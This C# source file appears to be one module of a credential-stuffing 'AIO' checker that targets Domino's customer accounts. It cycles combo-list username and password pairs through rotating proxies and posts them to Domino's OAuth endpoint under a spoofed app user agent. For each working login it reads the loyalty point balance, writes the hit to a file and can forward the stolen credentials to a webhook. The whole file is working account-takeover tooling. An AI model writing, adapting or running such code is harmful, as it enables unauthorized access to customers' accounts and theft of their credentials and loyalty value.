using System;
using System.Collections.Generic;
using System.Linq;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using BoltCUI;
using Leaf.xNet;

namespace Bolt_AIO
{
    internal class Dominosmod
    {
        public static List<string> Combos = Program.Combos;
        public static int Combosindex;

        public static void Check()
        {
            for (;;)
            {
                if (Program.Proxyindex > Program.Proxies.Count() - 2) Program.Proxyindex = 0;
                try
                {
                    Interlocked.Increment(ref Program.Proxyindex);
                    using (var req = new HttpRequest())
                    {
                        if (Combosindex >= Combos.Count())
                        {
                            Program.Stop++;
                            break;
                        }

                        Interlocked.Increment(ref Combosindex);
                        var array = Combos[Combosindex].Split(':', ';', '|');
                        var text = array[0] + ":" + array[1];
                        try
                        {
                            switch (Program.ProxyType1)
                            {
                                case "HTTP":
                                    req.Proxy = HttpProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS4":
                                    req.Proxy = Socks4ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS5":
                                    req.Proxy = Socks5ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "NO":
                                    req.Proxy = null;
                                    break;
                            }

                            req.AllowAutoRedirect = false;
                            req.IgnoreProtocolErrors = true;
                            req.UserAgent = "DominosAndroid/6.4.1 (Android 5.1; unknown/Google Nexus 6; en)";
                            var str1 =
                                "grant_type=password&validator_id=VoldemortCredValidator&client_id=nolo-rm&scope=customer%3Acard%3Aread+customer%3Aprofile%3Aread%3Aextended+customer%3AorderHistory%3Aread+customer%3Acard%3Aupdate+customer%3Aprofile%3Aread%3Abasic+customer%3Aloyalty%3Aread+customer%3AorderHistory%3Aupdate+customer%3Acard%3Acreate+customer%3AloyaltyHistory%3Aread+order%3Aplace%3AcardOnFile+customer%3Acard%3Adelete+customer%3AorderHistory%3Acreate+customer%3Aprofile%3Aupdate+easyOrder%3AoptInOut+easyOrder%3Aread&username=" +
                                array[0] + "&password=" + array[1];
                            req.SslCertificateValidatorCallback += (obj, cert, ssl, error) =>
                                (cert as X509Certificate2).Verify();
                            var input = req.Post("https://authproxy.dominos.com/auth-proxy-service/token.oauth2", str1,
                                "application/x-www-form-urlencoded").ToString();
                            if (input.Contains("access_token"))
                            {
                                var str2 = Regex.Match(input, "access_token\":\"(.*?)\"").Groups[1].Value;
                                req.Authorization = "Bearer " + str2;
                                req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";
                                var str3 = Regex
                                    .Match(
                                        req.Post("https://order.dominos.com/power/login",
                                            "loyaltyIsActive=true&rememberMe=false&u=" + array[1] + "&p=" + array[1],
                                            "application/x-www-form-urlencoded").ToString(),
                                        ",\"CustomerID\":\"(.*?)\"").Groups[1].Value;
                                var str4 = Regex
                                    .Match(
                                        req.Get("https://order.dominos.com/power/customer/" + str3 +
                                                "/loyalty?_=1581984138984").ToString(), "VestedPointBalance\":(.*?),")
                                    .Groups[1].Value;
                                Program.TotalChecks++;
                                Program.Hits++;
                                if (Program.lorc == "LOG")
                                    Settings.PrintHit("Dominos", array[0] + ":" + array[1] + " | Points: " + str4);
                                Export.AsResult("/Dominos_hits", array[0] + ":" + array[1] + " | Points: " + str4);
                                if (Settings.sendToWebhook)
                                    Settings.sendTowebhook1(array[0] + ":" + array[1], "Dominos");
                                req.Dispose();
                            }

                            if (input.Contains("Invalid username & password combination"))
                            {
                                Program.TotalChecks++;
                                Program.Fails++;
                            }
                            else
                            {
                                Program.Combos.Add(text);
                                req.Dispose();
                            }
                        }
                        catch (Exception)
                        {
                            Program.Combos.Add(text);
                        }
                    }
                }
                catch
                {
                    Interlocked.Increment(ref Program.Errors);
                }
            }
        }

        private static string Parse(string source, string left, string right)
        {
            return source.Split(new string[1] {left}, StringSplitOptions.None)[1].Split(new string[1]
            {
                right
            }, StringSplitOptions.None)[0];
        }

        public static string Base64Encode(string plainText)
        {
            return Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));
        }
    }
}